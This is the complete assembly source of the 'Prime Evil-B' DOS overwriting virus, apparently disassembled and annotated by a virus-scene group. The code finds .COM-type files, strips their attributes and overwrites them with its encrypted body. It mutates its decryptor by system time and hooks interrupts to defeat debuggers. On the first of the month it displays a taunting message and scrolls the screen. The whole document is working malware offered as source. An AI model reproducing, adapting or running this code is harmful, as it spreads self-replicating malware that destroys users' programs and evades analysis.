comment %
===============================================================================

                    Prime Evil-B Overwriter "Virus" Source
         Disassembled by Cruel Entity of The Funky Pack of CyberPunks
 Notes:
 Interresting programming style... :)

===============================================================================
        %

id              equ     0DB33h
dta_filename    equ     9Eh

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

prime           proc    far

vstart          equ     $

start:
                xor     bx,bx                   ; Zero register
                nop
                nop
                nop
                nop
                call    decrypt+1               ; decrypt
                nop
                nop
                nop
                db      0ebh,46h                ;jump to crypt_beg

prime           endp


decrypt         proc    near
data    db      00,53h,0bbh                     ; push bx
                push    sp

                add     [bx+si+9090h],dx        ; where to decrypt
                nop
                mov     cx,70eh                 ; # of bytes to decrypt
                nop
                nop
                nop
                push    cx
                nop
                nop
                nop
                mov     al,cs:data
                nop
                nop
                nop
                nop
decrypt2:       nop
                nop
                nop
                xor     [bx],al
                nop
                nop
                inc     bx
                nop
                nop
                loop    decrypt2
                pop     cx
                pop     bx
                nop
                nop
                nop
                nop
                inc     bx
                dec     bx
                jz      return
                nop
                nop
                nop
                nop
                mov     ah,40h
                xchg    si,dx
                nop
                nop
                int     21h
                xor     bx,bx
                nop
                nop
                nop
                jmp     decrypt+1
return:
                ret
                nop
        db      0e9h,80h,00h                    ; used to fuck debug
decrypt          endp

crypt_beg:
fmask           db      '*.C*', 0
message         db      'Prime Evil! '
                db      '(C) Spellbound, Line Noise 1992.',0dh,0ah
                db      'Coded in Stockholm, Sweden.', 0Dh, 0Ah
                db      'Please spell my name right!$'


f_size          db      0, 0
f_time          dw      0
f_date          dw      0
data_12         dw      0
m_seg           dw      0                 ;memory segment


int_24h_entry   proc    far                     ; this replaces int24
                mov     bl,3
                iret                            ; interrupt return
int_24h_entry   endp

f_handle        dw      0
int_jmp         db      0EAh, 5Bh,0E0h, 00h,0F0h
int_1:
                mov     dx,offset int_jmp
fuck_sr_1:
                mov     ax,0fe05h               ; hook int 1 and int 3
                jmp     fuck_sr_1+1             ; (which fucks debug)
                add     ax,0ebfeh
                sub     ah,0b1h
                int     21h
                add     al,02h
                int     21h
                mov     al,0ffh
                out     21h,al

                mov     ah,4ah
                mov     bx,00c8h
                int     21h
                mov     ah,48h
                mov     bx,0096h
                int     21h
                mov     cs:m_seg,ax             ; allocate memory

                mov     ax,2524h
                mov     dx,offset int_24h_entry
                int     21h                     ; change int24h
                                                ; set intrpt vector al to ds:dx

                mov     ah,2Ah                  ; get date
                int     21h

                cmp     dl,1                    ; is it day 1?

                jne     not_day1                ; no it isn't

                mov     ah,9
                mov     dx,offset message       ; then display a message
                int     21h                     ;
                                                ;
                call    pan_screen              ; and pan the screen


not_day1:
                mov     dx,offset fmask
                mov     ah,4Eh
                int     21h                     ; find 1st .COM file

                jnc     found_com               ; if no error, move on to
                                                ; found_com

                xor     al,al                   ; no .COM file found
                out     21h,al                  ; exit to dos
                retn
found_com:
                mov     ax,4300h
                mov     dx,dta_filename
                int     21h                     ; get file attribute

                push    cx                      ; save attrib
                mov     ax,4301h
                xor     cx,cx
                int     21h                     ; set attrib to normal

                xor     al,al                   ;
                out     21h,al                  ; port 21h, 8259-1 int comands

                mov     dx,dta_filename
                mov     word ptr cs:f_size,dx   ; save file size

                mov     ax,3D02h
                int     21h                     ; open file

                jnc     opened_ok               ; Jump if not error
                jmp     find_next               ;
;
;               ^^^ interesting way of solving the error jumping...
;

opened_ok:
                mov     cs:f_handle,ax          ; save file handle

                mov     ax,5700h                ; get file date/time
                mov     bx,cs:f_handle
                int     21h

                jnc     get_date_ok             ; Jump if no error

                retn                            ; error when checking
                                                ; file time/date, exit to DOS

get_date_ok:
                mov     cs:f_time,cx            ; save file time
                mov     cs:f_date,dx            ; and file date


                mov     ah,3Fh                  ; read file to memory
                mov     cx,70eh                 ; <- virus size
                push    ds                      ; save data seg
                mov     ds,cs:m_seg             ; memory segment
                mov     dx,0
                int     21h

                push    ax                      ; save bytes

                mov     si,0
                lodsw                           ; String [si] to ax
                xchg    ax,si
                pop     ax
                pop     ds                      ; restore data seg
                mov     word ptr cs:f_size,ax   ; save file size
                cmp     si,id                   ; already infected??
                jne     readed_ok               ; nope...
                jmp     already_inf             ;
readed_ok:
                push    ds                      ; save data seg
                mov     ds,cs:m_seg             ; copy memory seg to ds
                mov     es,cs:m_seg             ; and es
                xor     di,di                   ;
                xor     si,si                   ;
                mov     cx,70eh                 ; virus size

                mov     ah,0F3h                 ; decryption value

crypt_file:
                lodsb                           ; load a byte
                xor     al,ah                   ; decrypt it
                stosb                           ; and save it
                loop    crypt_file

                pop     ds                      ; restore data seg

                mov     ax,4200h                ; move file ptr.
                xor     cx,cx                   ; to beginning of file
                xor     dx,dx
                int     21h

                mov     ah,2Ch                  ; get system time
                int     21h

                xchg    dh,al                   ; second to al
                xor     ah,ah                   ;
                mul     cl                      ;   cl *  al = ax
                                                ; (min * sec = ax)
                add     al,dl                   ; add al,minutes
                add     ax,70eh                 ; add ax,virulen
                add     al,byte ptr cs:[10Eh]
                mov     byte ptr cs:[10Eh],al

                call    crypt                   ; decrypt the shit

                push    cs                      ; cs to ds
                pop     ds

                mov     si,100h
                mov     bx,cs:f_handle
                call    decrypt+1

                mov     ax,4202h                ; move file ptr to eof
                mov     bx,cs:f_handle
                xor     cx,cx
                xor     dx,dx
                int     21h

                mov     ah,40h                  ; write original file
                mov     cx,word ptr cs:f_size
                push    ds                      ; save data seg
                mov     ds,cs:m_seg
                mov     dx,0
                int     21h

                pop     ds                      ; restore data seg

                mov     ax,5701h                ; restore file time/date
                mov     cx,cs:f_time
                mov     dx,cs:f_date
                int     21h

                jc      exit                    ; exit if error

                mov     ah,3Eh                  ; close file
                int     21h

                pop     cx
                mov     dx,dta_filename         ; restore attrib
                mov     ax,4301h
                int     21h

                jmp     short exit
already_inf:
                mov     ah,3Eh                  ; close file
                int     21h

                pop     cx                      ; restore attrib
                mov     dx,dta_filename
                mov     ax,4301h
                int     21h
find_next:
                mov     ah,4Fh
                int     21h                     ; find next .COM file

                jc      screw                   ; jump if error
                jmp     found_com               ; else, do next .COM file

exit:
                retn                            ; exit to dos
screw:
                int     1                       ; single step
                retn

pan_screen      proc    near                    ; this routine will scroll
                mov     cs:data_12,0            ; the screen and reboot
loc_15:
                mov     bx,cs:data_12           ; lots of messing with the
                mov     dx,3D4h                 ; video ports below...
                mov     ah,bh                   ;
                mov     al,0Ch                  ;
                out     dx,ax                   ; port 3D4h, CGA/EGA reg index
                                                ; al = 0Ch, start address high
                mov     ah,bl
                inc     al
                out     dx,ax                   ; port 3D4h, CGA/EGA reg index
                                                ; al = 0Dh, start address low
                mov     dx,3DAh
loc_16:
                in      al,dx                   ; port 3DAh, CGA/EGA vid status
                test    al,8
                jnz     loc_16                  ; Jump if not zero
loc_17:
                in      al,dx                   ; port 3DAh, CGA/EGA vid status
                test    al,8
                jz      loc_17                  ; Jump if zero
                inc     cs:data_12
                cmp     cs:data_12,50h
                jle     loc_15                  ; Jump if < or =
                mov     cs:data_12,0
                retn
pan_screen      endp


crypt           proc    near
                push    cs                      ; move cs to ds and es
                push    cs
                pop     ds
                pop     es

                mov     di,113h
                call    get_time                ; get system time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_22                  ; Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_21                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_20                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_19                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_18                  ; Jump if below

                call    write_31h_0c7h          ; The stuff below this
                call    write_31h_0cfh          ; is just for mutating
                                                ; some instructions in the
                jmp     short loc_23            ; decryptioning routine.
loc_18:                                         ;
                call    write_31h_0ddh
                call    write_45h
                call    write_4fh
                jmp     short loc_23
loc_19:
                call    write_31h_0f7h
                call    write_31h_0edh
                jmp     short loc_23
loc_20:
                call    write_8dh_3eh_BL_BH
                jmp     short loc_23
loc_21:
                call    write_83h_0c7h_DL
                call    write_47h
                jmp     short loc_23
loc_22:
                call    write_0ebh_0
                call    write_31h_0ffh
loc_23:
                mov     di,11Ah
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_28                  ; Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_27                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_26                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_25                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_24                  ; Jump if below

                call    write_31h_0cfh
                call    write_45h

                jmp     short loc_29
loc_24:
                call    write_47h
                call    write_47h
                call    write_47h
                jmp     short loc_29
loc_25:
                call    write_31h_0c7h
                call    write_45h
                jmp     short loc_29
loc_26:
                call    write_0ebh_0
                call    write_45h
                jmp     short loc_29
loc_27:
                call    write_47h
                call    write_31h_0edh
                jmp     short loc_29
loc_28:
                call    write_83h_0c7h_DL
loc_29:
                mov     di,11Eh
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_34                  ; Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_33                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_32                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_31                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_30                  ; Jump if below

                call    write_31h_0d7h
                call    write_45h

                jmp     short loc_35
loc_30:
                call    write_31h_0edh
                call    write_45h
                jmp     short loc_35
loc_31:
                call    write_83h_0c7h_DL
                jmp     short loc_35
loc_32:
                call    write_0bfh_BL_0bfh
                jmp     short loc_35
loc_33:
                call    write_31h_0d5h
                call    write_4fh
                jmp     short loc_35
loc_34:
                call    write_4fh
                call    write_4fh
                call    write_47h
loc_35:
                mov     di,125h
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_40                    ;Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_39                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_38                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_37                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_36                  ; Jump if below

                call    write_31h_0cfh
                call    write_31h_0c7h

                jmp     short loc_41
loc_36:
                call    write_45h
                call    write_31h_0ddh
                call    write_4fh
                jmp     short loc_41
loc_37:
                call    write_31h_0ffh
                call    write_31h_0c5h
                jmp     short loc_41
loc_38:
                call    write_83h_0c7h_DL
                call    write_47h
                jmp     short loc_41
loc_39:
                call    write_83h_0c7h_DL
                call    write_4fh
                jmp     short loc_41
loc_40:
                call    write_31h_0ffh
                call    write_0ebh_0
loc_41:
                mov     di,129h
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_46                    ;Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_45                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_44                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_43                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_42                  ; Jump if below

                call    write_45h
                call    write_31h_0edh

                jmp     short loc_47
loc_42:
                call    write_9h_0ffh
                call    write_4fh
                jmp     short loc_47
loc_43:
                call    write_21h_0efh
                call    write_45h
                jmp     short loc_47
loc_44:
                call    write_29h_0efh
                call    write_47h
                jmp     short loc_47
loc_45:
                call    write_0bfh_BL_0bfh
                jmp     short loc_47
loc_46:
                call    write_83h_0c7h_DL
loc_47:
                mov     di,12Eh
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_52                  ; Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_51                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_50                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_49                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_48                  ; Jump if below

                call    write_31h_0cfh

                jmp     short loc_53
loc_48:
                call    write_47h
                call    write_4fh
                jmp     short loc_53
loc_49:
                call    write_31h_0c5h
                jmp     short loc_53
loc_50:
                call    write_29h_0f7h
                jmp     short loc_53
loc_51:
                call    write_83h_0c7h_DL
                jmp     short loc_53
loc_52:
                call    write_0ebh_0
loc_53:
                mov     di,131h
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_58                    ;Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_57                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_56                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_55                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_54                  ; Jump if below

                call    write_29h_0cfh

                jmp     short loc_59
loc_54:
                call    write_47h
                call    write_4fh
                jmp     short loc_59
loc_55:
                call    write_31h_0f5h
                jmp     short loc_59
loc_56:
                call    write_45h
                call    write_4fh
                jmp     short loc_59
loc_57:
                call    write_9h_0efh
                jmp     short loc_59
loc_58:
                call    write_0ebh_0
                call    write_47h
loc_59:
                mov     di,137h
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_64                    ;Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_63                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_62                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_61                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_60                  ; Jump if below

                call    write_31h_0c7h
                call    write_31h_0dfh

                jmp     short loc_65
loc_60:
                call    write_81h_0efh
                jmp     short loc_65
loc_61:
                call    write_9h_0ffh
                call    write_21h_0efh
                jmp     short loc_65
loc_62:
                call    write_83h_0c7h_DL
                call    write_47h
                jmp     short loc_65
loc_63:
                call    write_31h_0f7h
                call    write_21h_0efh
                jmp     short loc_65
loc_64:
                call    write_0ebh_0
                call    write_0ebh_0
loc_65:
                mov     di,13Fh
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_70                    ;Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_69                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_68                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_67                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_66                  ; Jump if below

                call    write_31h_0d7h
                call    write_29h_0f7h

                jmp     short loc_71
loc_66:
                call    write_9h_0efh
                call    write_47h
                call    write_47h
                jmp     short loc_71
loc_67:
                call    write_31h_0f7h
                call    write_31h_0edh
                jmp     short loc_71
loc_68:
                call    write_83h_0c7h_DL
                call    write_4fh
                jmp     short loc_71
loc_69:
                call    write_31h_0ffh
                call    write_31h_0ffh
                jmp     short loc_71
loc_70:
                call    write_31h_0f7h
                call    write_0ebh_0
loc_71:
                mov     di,147h
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_76                    ;Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_75                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_74                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_73                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_72                  ; Jump if below

                call    write_31h_0c7h

                jmp     short loc_77
loc_72:
                call    write_4fh
                call    write_4fh
                jmp     short loc_77
loc_73:
                call    write_21h_0efh
                jmp     short loc_77
loc_74:
                call    write_9h_0efh
                jmp     short loc_77
loc_75:
                call    write_45h
                call    write_4dh
                jmp     short loc_77
loc_76:
                call    write_0ebh_0
loc_77:
                mov     di,14Dh
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_82                    ;Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_81                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_80                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_79                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_78                  ; Jump if below

                call    write_31h_0f7h
                call    write_47h

                jmp     short loc_83
loc_78:
                call    write_31h_0ddh
                call    write_4fh
                jmp     short loc_83
loc_79:
                call    write_31h_0f7h
                call    write_47h
                jmp     short loc_83
loc_80:
                call    write_83h_0c7h_DL
                jmp     short loc_83
loc_81:
                call    write_0bfh_BL_0bfh
                jmp     short loc_83
loc_82:
                call    write_47h
                call    write_0ebh_0
loc_83:
                mov     di,102h
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_88                    ;Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_87                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_86                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_85                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_84                  ; Jump if below

                call    write_31h_0c7h
                call    write_31h_0cfh

                jmp     short loc_89
loc_84:
                call    write_31h_0ddh
                call    write_45h
                call    write_4fh
                jmp     short loc_89
loc_85:
                call    write_31h_0f7h
                call    write_31h_0edh
                jmp     short loc_89
loc_86:
                call    write_8dh_3eh_BL_BH
                jmp     short loc_89
loc_87:
                call    write_83h_0c7h_DL
                call    write_47h
                jmp     short loc_89
loc_88:
                call    write_0ebh_0
                call    write_31h_0ffh
loc_89:
                mov     di,109h
                call    get_time

                cmp     dh,0Ah                  ; if seconds = 0ah
                jb      loc_94                    ;Jump if below

                cmp     dh,14h                  ; if seconds = 14h
                jb      loc_93                  ; Jump if below

                cmp     dh,1Eh                  ; if seconds = 1eh
                jb      loc_92                  ; Jump if below

                cmp     dh,28h                  ; if seconds = 28h
                jb      loc_91                  ; Jump if below

                cmp     dh,32h                  ; if seconds = 32h
                jb      loc_90                  ; Jump if below

                call    write_0ebh_0
                call    write_47h

                jmp     short loc_ret_95
loc_90:
                call    write_0ebh_0
                call    write_4fh
                jmp     short loc_ret_95
loc_91:
                call    write_47h
                call    write_47h
                call    write_45h
                jmp     short loc_ret_95
loc_92:
                call    write_83h_0c7h_DL
                jmp     short loc_ret_95
loc_93:
                call    write_47h
                call    write_31h_0ffh
                jmp     short loc_ret_95
loc_94:
                call    write_0ebh_0
                call    write_47h

loc_ret_95:
                retn
crypt           endp



get_time        proc    near
                mov     ah,2Ch                  ; get system time
                int     21h

                retn
get_time        endp


write_31h_0c5h           proc    near
                mov     al,31h
                stosb                           ; Store al to es:[di]
                mov     al,0C5h
                stosb                           ; Store al to es:[di]
                retn
write_31h_0c5h           endp


write_31h_0ddh           proc    near
                mov     al,31h
                stosb                           ; Store al to es:[di]
                mov     al,0DDh
                stosb                           ; Store al to es:[di]
                retn
write_31h_0ddh           endp

                mov     al,31h
                stosb                           ; Store al to es:[di]
                mov     al,0CDh
                stosb                           ; Store al to es:[di]
                retn


write_31h_0d5h           proc    near
                mov     al,31h                  ; '1'
                stosb                           ; Store al to es:[di]
                mov     al,0D5h
                stosb                           ; Store al to es:[di]
                retn
write_31h_0d5h           endp



write_31h_0f5h           proc    near
                mov     al,31h                  ; '1'
                stosb                           ; Store al to es:[di]
                mov     al,0F5h
                stosb                           ; Store al to es:[di]
                retn
write_31h_0f5h           endp

                mov     al,31h                  ; '1'
                stosb                           ; Store al to es:[di]
                mov     al,0FDh
                stosb                           ; Store al to es:[di]
                retn


write_31h_0edh           proc    near
                mov     al,31h                  ; '1'
                stosb                           ; Store al to es:[di]
                mov     al,0EDh
                stosb                           ; Store al to es:[di]
                retn
write_31h_0edh           endp


write_31h_0c7h          proc    near
                mov     al,31h                  ; '1'
                stosb                           ; Store al to es:[di]
                mov     al,0C7h
                stosb                           ; Store al to es:[di]
                retn
write_31h_0c7h          endp


write_31h_0dfh          proc    near
                mov     al,31h                  ; '1'
                stosb                           ; Store al to es:[di]
                mov     al,0DFh
                stosb                           ; Store al to es:[di]
                retn
write_31h_0dfh          endp


write_31h_0cfh          proc    near
                mov     al,31h                  ; '1'
                stosb                           ; Store al to es:[di]
                mov     al,0CFh
                stosb                           ; Store al to es:[di]
                retn
write_31h_0cfh          endp


write_31h_0d7h          proc    near
                mov     al,31h                  ; '1'
                stosb                           ; Store al to es:[di]
                mov     al,0D7h
                stosb                           ; Store al to es:[di]
                retn
write_31h_0d7h          endp

                mov     al,31h                  ; '1'
                stosb                           ; Store al to es:[di]
                mov     al,0EFh
                stosb                           ; Store al to es:[di]
                retn

write_31h_0f7h          proc    near
                mov     al,31h
                stosb                           ; tore al to es:[di]
                mov     al,0F7h
                stosb                           ; tore al to es:[di]
                retn
write_31h_0f7h          endp


write_31h_0ffh          proc    near
                mov     al,31h
                stosb                           ; tore al to es:[di]
                mov     al,0FFh
                stosb                           ; tore al to es:[di]
                retn
write_31h_0ffh          endp



write_45h          proc    near
                mov     al,45h                  ; 'E'
                stosb                           ; Store al to es:[di]
                retn
write_45h          endp


write_4dh          proc    near
                mov     al,4Dh                  ; 'M'
                stosb                           ; Store al to es:[di]
                retn
write_4dh          endp

write_47h          proc    near
                mov     al,47h                  ; 'G'
                stosb                           ; Store al to es:[di]
                retn
write_47h          endp


write_4fh          proc    near
                mov     al,4Fh                  ; 'O'
                stosb                           ; Store al to es:[di]
                retn
write_4fh          endp


write_0bfh_BL_0bfh          proc    near
                mov     al,0BFh
                stosb                           ; Store al to es:[di]
                mov     al,bl
                stosb                           ; Store al to es:[di]
                mov     al,al
                stosb                           ; Store al to es:[di]
                retn
write_0bfh_BL_0bfh          endp

write_8dh_3eh_BL_BH          proc    near
                mov     al,8Dh
                stosb                           ; Store al to es:[di]
                mov     al,3Eh                  ; '>'
                stosb                           ; Store al to es:[di]
                mov     al,bl
                stosb                           ; Store al to es:[di]
                mov     al,bh
                stosb                           ; Store al to es:[di]
                retn
write_8dh_3eh_BL_BH          endp

write_83h_0c7h_DL          proc    near
                mov     al,83h
                stosb                           ; Store al to es:[di]
                mov     al,0C7h
                stosb                           ; Store al to es:[di]
                mov     al,dl
                stosb                           ; Store al to es:[di]
                retn
write_83h_0c7h_DL          endp


write_0ebh_0          proc    near
                mov     al,0EBh
                stosb                           ; Store al to es:[di]
                mov     al,0
                stosb                           ; Store al to es:[di]
                retn
write_0ebh_0          endp


write_9h_0ffh          proc    near
                mov     al,9
                stosb                           ; Store al to es:[di]
                mov     al,0FFh
                stosb                           ; Store al to es:[di]
                retn
write_9h_0ffh          endp

write_9h_0efh          proc    near
                mov     al,9
                stosb                           ; Store al to es:[di]
                mov     al,0EFh
                stosb                           ; Store al to es:[di]
                retn
write_9h_0efh          endp


write_21h_0efh          proc    near
                mov     al,21h                  ; '!'
                stosb                           ; Store al to es:[di]
                mov     al,0EFh
                stosb                           ; Store al to es:[di]
                retn
write_21h_0efh          endp

write_81h_0efh          proc    near
                mov     al,81h
                stosb                           ; Store al to es:[di]
                mov     al,0EFh
                stosb                           ; Store al to es:[di]
                retn
write_81h_0efh          endp

                mov     al,29h                  ; ')'
                stosb                           ; Store al to es:[di]
                mov     al,0C7h
                stosb                           ; Store al to es:[di]
                retn

write_29h_0cfh          proc    near
                mov     al,29h                  ; ')'
                stosb                           ; Store al to es:[di]
                mov     al,0CFh
                stosb                           ; Store al to es:[di]
                retn
write_29h_0cfh          endp

                mov     al,29h                  ; ')'
                stosb                           ; Store al to es:[di]
                mov     al,0D7h
                stosb                           ; Store al to es:[di]
                retn

write_29h_0f7h          proc    near
                mov     al,29h                  ; ')'
                stosb                           ; Store al to es:[di]
                mov     al,0F7h
                stosb                           ; Store al to es:[di]
                retn
write_29h_0f7h          endp


write_29h_0efh          proc    near
                mov     al,29h                  ; ')'
                stosb                           ; Store al to es:[di]
                mov     al,0EFh
                stosb                           ; Store al to es:[di]
                retn
write_29h_0efh          endp

vend            equ     $

seg_a           ends
                end     start
